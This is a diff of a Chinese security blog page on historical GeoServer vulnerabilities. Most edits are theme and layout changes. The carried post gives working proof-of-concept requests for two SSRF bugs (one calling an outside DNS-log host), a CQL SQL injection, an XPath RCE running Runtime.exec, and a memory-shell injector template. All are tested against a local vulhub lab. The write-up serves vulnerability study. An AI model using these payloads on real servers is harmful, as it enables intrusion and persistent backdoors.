@@ -3,14 +3,28 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#f7f7f4">
-<meta name="color-scheme" content="light">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#f7f7f4" data-theme-color-light="#f7f7f4" data-theme-color-dark="#161614">
 
 <title>geoserver历史漏洞 — CurlySean&#39;s Blog</title>
 <meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
-<link rel="canonical" href="http://curlysean.github.io/2025/11/12/geoserver%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/">
+<link rel="canonical" href="https://curlysean.github.io/2025/11/12/geoserver%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/">
+<link rel="preload" href="/fonts/instrument-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/jetbrains-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/css/style.css">
-<script>document.documentElement.classList.add('js')</script>
+<script>
+  (function () {
+    try {
+      var key = 'sheepfold-theme';
+      var saved = localStorage.getItem(key);
+      var dark = saved === 'dark' || (saved !== 'light' && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+      document.documentElement.classList.add('js');
+    } catch (error) {
+      document.documentElement.classList.add('js');
+    }
+  })();
+</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="page-type-post">
@@ -37,11 +51,18 @@
         <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
-    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
-      <span class="sr-only">打开导航</span>
-      <span></span><span></span>
-    </button>
+    <div class="site-header__actions">
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换颜色模式" title="切换颜色模式">
+        <span data-theme-toggle-label>暗色</span>
+      </button>
+      
+        <a class="header-cta header-cta--ghost" href="/archives/">全部文章 <span aria-hidden="true">↗</span></a>
+      
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+        <span class="sr-only">打开导航</span>
+        <span></span><span></span>
+      </button>
+    </div>
   </div>
   <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
     <div class="frame mobile-nav__inner">
@@ -90,12 +111,6 @@
         
       </div>
     </div>
-    <div class="frame post-meta-grid reveal">
-      <div><span>发布</span><time datetime="2025-11-12T05:22:12.000Z">2025.11.12</time></div>
-      <div><span>更新</span><time datetime="2025-11-12T05:22:12.000Z">2025.11.12</time></div>
-      <div><span>阅读</span><strong>20 MIN</strong></div>
-      <div><span>标签</span><strong>1</strong></div>
-    </div>
   </header>
 
   <div class="frame post-content-layout">
@@ -103,13 +118,19 @@
       <div class="post-rail__inner">
         <p class="eyebrow">ON THIS PAGE</p>
         
-          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#aecD8"><span class="toc-text">geoserver历史漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#zj21G"><span class="toc-text">geoserver介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRj7Q"><span class="toc-text">历史漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#S1OYK"><span class="toc-text">弱口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DPQ9W"><span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EnQXW"><span class="toc-text">CVE-2023-43795</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wFOGB"><span class="toc-text">CVE-2021-40822</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ubZAI"><span class="toc-text">SQL注入 CVE-2023-25157</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gy5qn"><span class="toc-text">XPath表达式 RCE CVE-2024-36401</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Z32or"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HaLl3"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Y7dgB"><span class="toc-text">内存马注入</span></a></li></ol></li></ol></li></ol></li></ol></nav>
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#zj21G"><span class="toc-text">geoserver介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MRj7Q"><span class="toc-text">历史漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#S1OYK"><span class="toc-text">弱口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DPQ9W"><span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EnQXW"><span class="toc-text">CVE-2023-43795</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#wFOGB"><span class="toc-text">CVE-2021-40822</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ubZAI"><span class="toc-text">SQL注入 CVE-2023-25157</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gy5qn"><span class="toc-text">XPath表达式 RCE CVE-2024-36401</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Z32or"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HaLl3"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Y7dgB"><span class="toc-text">内存马注入</span></a></li></ol></li></ol></li></ol></nav>
         
       </div>
     </aside>
     <div class="article-column">
+      <div class="post-meta-grid reveal">
+        <div><span>发布</span><time datetime="2025-11-12T05:22:12.000Z">2025.11.12</time></div>
+        <div><span>更新</span><time datetime="2025-11-12T05:22:12.000Z">2025.11.12</time></div>
+        <div><span>阅读</span><strong>约 7 分钟</strong></div>
+        <div><span>标签</span><strong>1</strong></div>
+      </div>
       <div class="article-body">
-        <h1 id="aecD8">geoserver历史漏洞</h1>
+        
 <h2 id="zj21G">geoserver介绍</h2>
 GGeoServer 是一个开源的地理信息服务器，用于发布和共享地理空间数据。它是由 GeoTools 库驱动的，GeoTools 是一个用于处理地理数据的 Java 库。GeoServer 允许用户从各种数据源（如 Shapefile、PostGIS、Oracle Spatial、ArcSDE 等）发布地理空间数据，并通过标准的 OGC（Open Geospatial Consortium）协议（如 WMS、WFS、WCS 等）进行访问。
 
@@ -126,12 +147,12 @@ GGeoServer 是一个开源的地理信息服务器，用于发布和共享地理
 这个SSRF漏洞需要geoserver配置wps插件，默认情况下，geoserver是没有wps插件的，因此需要我们手动配置
 
 <p>从链接中下载插件压缩包：<code>https://sourceforge.net/projects/geoserver/files/GeoServer/2.22.1/extensions/geoserver-2.22.1-wps-plugin.zip/download</code>，将所有的<code>*.jar</code>包全放入<code>geoserver-2.22.1-bin/webapps/geoserver/WEB-INF/lib</code>中，重启geoserver，我们进入后台，就可以看到wps插件了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762682337864-b7f2eefd-06a3-429f-9a03-da4f28ac7aa5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762682337864-b7f2eefd-06a3-429f-9a03-da4f28ac7aa5.png" alt="geoserver历史漏洞" loading="lazy"></p>
 <p>漏洞POC如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">POST /geoserver/wms HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8088</span></span><br><span class="line">Content-Length: <span class="number">999</span></span><br><span class="line">Accept: application/xml, text/xml, */*; q=<span class="number">0.01</span></span><br><span class="line">Wicket-Ajax-BaseURL: wicket/bookmarkable/org.geoserver.wps.web.WPSRequestBuilder?<span class="number">15</span></span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Wicket-Ajax: true</span><br><span class="line">Wicket-FocusedElementId: id44</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10_15_7</span>) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">126.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Content-<span class="type">Type</span>: application/xml</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;wps:Execute version=<span class="string">&quot;1.0.0&quot;</span> service=<span class="string">&quot;WPS&quot;</span></span><br><span class="line">             xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">             xmlns=<span class="string">&quot;http://www.opengis.net/wps/1.0.0&quot;</span></span><br><span class="line">             xmlns:wfs=<span class="string">&quot;http://www.opengis.net/wfs&quot;</span></span><br><span class="line">             xmlns:wps=<span class="string">&quot;http://www.opengis.net/wps/1.0.0&quot;</span></span><br><span class="line">             xmlns:ows=<span class="string">&quot;http://www.opengis.net/ows/1.1&quot;</span></span><br><span class="line">             xmlns:gml=<span class="string">&quot;http://www.opengis.net/gml&quot;</span></span><br><span class="line">             xmlns:ogc=<span class="string">&quot;http://www.opengis.net/ogc&quot;</span></span><br><span class="line">             xmlns:wcs=<span class="string">&quot;http://www.opengis.net/wcs/1.1.1&quot;</span></span><br><span class="line">             xmlns:xlink=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span></span><br><span class="line">             xsi:schemaLocation=<span class="string">&quot;http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd&quot;</span>&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;ows:Identifier&gt;JTS:area&lt;/ows:Identifier&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;wps:DataInputs&gt;</span><br><span class="line">    &lt;wps:Input&gt;</span><br><span class="line">      &lt;ows:Identifier&gt;geom&lt;/ows:Identifier&gt;</span><br><span class="line">      &lt;wps:Reference mimeType=<span class="string">&quot;application/json&quot;</span></span><br><span class="line">                     xlink:href=<span class="string">&quot;http://test.qccfahdlsf.lfcx.eu.org&quot;</span></span><br><span class="line">                     method=<span class="string">&quot;GET&quot;</span>/&gt;</span><br><span class="line">    &lt;/wps:Input&gt;</span><br><span class="line">  &lt;/wps:DataInputs&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;wps:ResponseForm&gt;</span><br><span class="line">    &lt;wps:RawDataOutput&gt;</span><br><span class="line">      &lt;ows:Identifier&gt;result&lt;/ows:Identifier&gt;</span><br><span class="line">    &lt;/wps:RawDataOutput&gt;</span><br><span class="line">  &lt;/wps:ResponseForm&gt;</span><br><span class="line">  </span><br><span class="line">&lt;/wps:Execute&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>我们这里成功接收到了DNS请求</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762761556990-86c2224e-f1cc-4317-9f16-8e5a653f9a6d.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762761556990-86c2224e-f1cc-4317-9f16-8e5a653f9a6d.png" alt="geoserver历史漏洞" loading="lazy"></p>
 <h4 id="wFOGB">CVE-2021-40822</h4>
 在GeoServer 2.19.3、2.18.5和2.17.6版本之前，WMS GetMap请求中存在服务器端请求伪造（SSRF）漏洞。攻击者可以利用此漏洞通过GeoServer服务器向内部或外部服务发送请求
 
@@ -142,7 +163,7 @@ GGeoServer 是一个开源的地理信息服务器，用于发布和共享地理
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/geoserver/TestWfsPost</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.baidu.com</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>96</span><br><span class="line"></span><br><span class="line"><span class="language-sas">form_hf_0=<span class="variable">&amp;url</span>=http://www.baidu.com/geoserver/../<span class="variable">&amp;body</span>=testtest<span class="variable">&amp;username</span>=admin<span class="variable">&amp;password</span>=admin</span></span><br></pre></td></tr></table></figure>
 
 <p>可以成功返回目标url的响应内容，本来想着有回显，想尝试一下读文件，但是由于后端进行了类型转换，<code>FtpURLConnection</code>不能转为<code>HttpURLConnection</code>而报错</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762763466716-6aaba923-7be3-48e0-8b31-a476efb1eff5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762763466716-6aaba923-7be3-48e0-8b31-a476efb1eff5.png" alt="geoserver历史漏洞" loading="lazy"></p>
 <h3 id="ubZAI">SQL注入 CVE-2023-25157</h3>
 影响版本：
 
@@ -155,12 +176,12 @@ GGeoServer 是一个开源的地理信息服务器，用于发布和共享地理
 </ul>
 <p>首先访问<code>/geoserver/ows?service=WFS&amp;version=1.0.0&amp;request=GetCapabilities</code>获取<code>&lt;Name&gt;</code>标签中的信息，地理图层列表</p>
 <p>这里以<code>vulhub:example</code>为例</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762789094379-7f0d94fd-4e56-444f-901f-0041f4ea33db.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762789094379-7f0d94fd-4e56-444f-901f-0041f4ea33db.png" alt="geoserver历史漏洞" loading="lazy"></p>
 <p>然后将typeName的name属性拼接到url中，SQL注入POC如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/geoserver/ows?service=wfs&amp;version=<span class="number">1.0</span><span class="number">.0</span>&amp;request=GetFeature&amp;typeName=vulhub:example&amp;CQL_FILTER=strStartsWith(name,%27x%<span class="number">27</span>%<span class="number">27</span>)%<span class="number">20</span>=%20true%<span class="number">20</span><span class="keyword">and</span>%<span class="number">201</span>=(SELECT%20CAST%<span class="number">20</span>((SELECT%20version())%20AS%<span class="number">20</span>integer))%<span class="number">20</span>--%<span class="number">20</span>%<span class="number">27</span>)%<span class="number">20</span>=%20true</span><br></pre></td></tr></table></figure>
 
 <p>成功获取到数据库版本号信息</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762789264085-ee4e4f4c-c97e-47f4-ae51-80d5a2078918.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762789264085-ee4e4f4c-c97e-47f4-ae51-80d5a2078918.png" alt="geoserver历史漏洞" loading="lazy"></p>
 <h3 id="gy5qn"><font style="color:rgb(22, 18, 9);">XPath表达式</font> RCE CVE-2024-36401</h3>
 该漏洞源于Geoserver使用的第三方库GeoTool因为使用了不安全的commons-jxpath 引擎处理xpath语句导致未授权能够通过发送各类OGC请求控制了复杂的xpath表达式并注入恶意代码从而rce
 
@@ -176,7 +197,7 @@ GGeoServer 是一个开源的地理信息服务器，用于发布和共享地理
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/geoserver/wfs</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8088</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>339</span><br><span class="line"></span><br><span class="line"><span class="language-vim">&lt;wf<span class="variable">s:GetFeature</span> service=<span class="string">&quot;WFS&quot;</span> <span class="keyword">version</span>=<span class="string">&quot;1.1.0&quot;</span></span></span><br><span class="line"><span class="language-vim">  xmln<span class="variable">s:topp</span>=<span class="string">&quot;http://www.openplans.org/topp&quot;</span></span></span><br><span class="line"><span class="language-vim">  xmln<span class="variable">s:wfs</span>=<span class="string">&quot;http://www.opengis.net/wfs&quot;</span></span></span><br><span class="line"><span class="language-vim">  xmlns=<span class="string">&quot;http://www.opengis.net/ogc&quot;</span></span></span><br><span class="line"><span class="language-vim">  xmln<span class="variable">s:gml</span>=<span class="string">&quot;http://www.opengis.net/gml&quot;</span></span></span><br><span class="line"><span class="language-vim">  xmln<span class="variable">s:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="language-vim">  xsi:schemaLocation=<span class="string">&quot;http://www.opengis.net/wfs&quot;</span>&gt;</span></span><br><span class="line"><span class="language-vim">  &lt;wf<span class="variable">s:Query</span> typeName=<span class="string">&quot;topp:states&quot;</span>&gt;</span></span><br><span class="line"><span class="language-vim">    <span class="symbol">&lt;Filter&gt;</span></span></span><br><span class="line"><span class="language-vim">      <span class="symbol">&lt;Intersects&gt;</span></span></span><br><span class="line"><span class="language-vim">        <span class="symbol">&lt;PropertyName&gt;</span>exec(java.lang.Runtime.getRuntime(),<span class="string">&quot;touch /tmp/geoserver.txt&quot;</span>)&lt;/PropertyName&gt;</span></span><br><span class="line"><span class="language-vim">        &lt;/Intersects&gt;</span></span><br><span class="line"><span class="language-vim">      &lt;/Filter&gt;</span></span><br><span class="line"><span class="language-vim">  &lt;/wf<span class="variable">s:Query</span>&gt;</span></span><br><span class="line"><span class="language-vim">&lt;/wf<span class="variable">s:GetFeature</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>文件创建成功</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762764186575-6b7eefdf-7b5b-4890-a5b3-49932e57c6a1.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762764186575-6b7eefdf-7b5b-4890-a5b3-49932e57c6a1.png" alt="geoserver历史漏洞" loading="lazy"></p>
 <p>除此之外，我们可以使用GET请求也是可以触发漏洞的，Poc如下</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/geoserver/wfs?request=GetPropertyValue&amp;service=wfs&amp;typeNames=topp:states&amp;valueReference=exec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29&amp;version=2.0.0</span><br></pre></td></tr></table></figure>
 
@@ -185,11 +206,11 @@ GGeoServer 是一个开源的地理信息服务器，用于发布和共享地理
 
 <p>明白了geoserver的路由以后，我们看到<code>GetPropertyValue#run</code>方法，在前面会解析我们body中的xml来获取参数，其中<code>propertyNameNoIndexs</code>参数为我们的<code>XPath</code>语句</p>
 <p>然后调用了<code>evaluate</code>方法，猜测他是用来解析<code>XPath</code>语句的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762764793628-e7d0d513-5316-4f56-ae5c-7ca44e2930aa.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762764793628-e7d0d513-5316-4f56-ae5c-7ca44e2930aa.png" alt="geoserver历史漏洞" loading="lazy"></p>
 <p>跟进<code>evaluate</code>方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762764941161-4dc25de4-d439-4056-95ef-4da7fbb9cd7f.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762764941161-4dc25de4-d439-4056-95ef-4da7fbb9cd7f.png" alt="geoserver历史漏洞" loading="lazy"></p>
 <p>再跟进<code>get</code>方法，可以看到，先调用<code>JXPathContext.newContext</code>，然后调用<code>context.iteratePointers(xpath)</code>来解析xpath语句，从而达到RCE的效果</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762764971923-b4cec92e-01ab-4134-9571-023f664689f7.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762764971923-b4cec92e-01ab-4134-9571-023f664689f7.png" alt="geoserver历史漏洞" loading="lazy"></p>
 <h4 id="Y7dgB">内存马注入</h4>
 正常情况下，我们使用js模板引擎来进行注入内存马，poc模板如下
 
@@ -202,14 +223,14 @@ GGeoServer 是一个开源的地理信息服务器，用于发布和共享地理
 <p>在我使用docker搭建起来vulhub中的geoserver后，多次尝试发现<code>Runtime.exec</code>可以成功执行命令，而想使用<code>ScriptEnginer</code>去执行javaScript表达式却一直不可以，最后发现问题：搭建的geoserver中JDK版本为17，在JDK17中，ashorn 引擎jdk17被移除了</p>
 <p>经过了长时间的探索，我在memshellParty中找到了可用的方式</p>
 <p>选择中间件为<code>Jetty</code>，利用方式为<code>JXPath</code>，打包方式为<code>JXPathSpringGzipJDK17</code>，且由于JDK17的强封装机制，注入器CLassName需要在<code>org.springframework.expression</code>下</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762767454919-9c05c105-6c58-4628-bdae-f16272c0ffb2.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762767454919-9c05c105-6c58-4628-bdae-f16272c0ffb2.png" alt="geoserver历史漏洞" loading="lazy"></p>
 <p>Poc模板如下</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/geoserver/wfs</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8088</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>339</span><br><span class="line"></span><br><span class="line"><span class="language-stylus">&lt;wfs:GetPropertyValue service=<span class="string">&#x27;WFS&#x27;</span> version=<span class="string">&#x27;2.0.0&#x27;</span></span></span><br><span class="line"><span class="language-stylus"> xmlns:topp=<span class="string">&#x27;http://www.openplans.org/topp&#x27;</span></span></span><br><span class="line"><span class="language-stylus"> xmlns:fes=<span class="string">&#x27;http://www.opengis.net/fes/2.0&#x27;</span></span></span><br><span class="line"><span class="language-stylus"> xmlns:wfs=<span class="string">&#x27;http://www.opengis.net/wfs/2.0&#x27;</span>&gt;</span></span><br><span class="line"><span class="language-stylus">  &lt;wfs:Query typeNames=<span class="string">&#x27;tiger:poi&#x27;</span>/&gt;</span></span><br><span class="line"><span class="language-stylus">  &lt;wfs:valueReference&gt;<span class="built_in">newInstance</span>(org<span class="selector-class">.springframework</span><span class="selector-class">.cglib</span><span class="selector-class">.core</span><span class="selector-class">.ReflectUtils</span><span class="selector-class">.defineClass</span>(<span class="string">&#x27;org.springframework.expression.dXZYzwrx&#x27;</span>,org<span class="selector-class">.springframework</span><span class="selector-class">.util</span><span class="selector-class">.StreamUtils</span><span class="selector-class">.copyToByteArray</span>(java<span class="selector-class">.util</span><span class="selector-class">.zip</span><span class="selector-class">.GZIPInputStream</span><span class="selector-class">.new</span>(java<span class="selector-class">.io</span><span class="selector-class">.ByteArrayInputStream</span><span class="selector-class">.new</span>(org<span class="selector-class">.springframework</span><span class="selector-class">.util</span><span class="selector-class">.Base64Utils</span><span class="selector-class">.decodeFromString</span>(<span class="string">&#x27;&#x27;</span>)))),<span class="built_in">getContextClassLoader</span>(java<span class="selector-class">.lang</span><span class="selector-class">.Thread</span><span class="selector-class">.currentThread</span>()),<span class="built_in">getProtectionDomain</span>(java<span class="selector-class">.lang</span><span class="selector-class">.Class</span><span class="selector-class">.forName</span>(<span class="string">&#x27;org.springframework.expression.ExpressionParser&#x27;</span>)),java<span class="selector-class">.lang</span><span class="selector-class">.Class</span><span class="selector-class">.forName</span>(<span class="string">&#x27;org.springframework.expression.ExpressionParser&#x27;</span>)))&lt;/wfs:valueReference&gt;</span></span><br><span class="line"><span class="language-stylus">&lt;/wfs:GetPropertyValue&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>如果爆出<code>ClassCastExeption</code>错误，则说明我们的代码执行成功</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762768302825-b1c5f135-96db-4227-964d-fccf4472c83c.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762768302825-b1c5f135-96db-4227-964d-fccf4472c83c.png" alt="geoserver历史漏洞" loading="lazy"></p>
 <p>内存马连接成功</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762768443054-fdf4d8ce-cf18-4570-af62-2b776024be20.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762768443054-fdf4d8ce-cf18-4570-af62-2b776024be20.png" alt="geoserver历史漏洞" loading="lazy"></p>
 
       </div>
       
@@ -225,13 +246,13 @@ GGeoServer 是一个开源的地理信息服务器，用于发布和共享地理
   <nav class="frame post-navigation" aria-label="相邻文章">
     
       <a href="/2025/12/01/%E5%8D%8E%E5%A4%8FERP%E5%AE%A1%E8%AE%A1/">
-        <span>← PREVIOUS</span>
+        <span>更新一篇</span>
         <strong>华夏ERP审计</strong>
       </a>
     
     
-      <a href="/2025/11/10/Nacos%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/">
-        <span>NEXT →</span>
+      <a class="post-navigation__older" href="/2025/11/10/Nacos%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/">
+        <span>更早一篇</span>
         <strong>Nacos历史漏洞</strong>
       </a>
     
@@ -245,9 +266,9 @@ GGeoServer 是一个开源的地理信息服务器，用于发布和共享地理
       <a href="/">CURLYSEAN</a>
       <span>持续记录，保持验证。</span>
     </div>
-    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <p class="site-footer__copyright">© 2025–2026 CurlySean</p>
     <nav class="site-footer__links" aria-label="外部链接">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
       <a href="mailto:5345414e@gmail.com">Email ↗</a>
     </nav>
   </div>
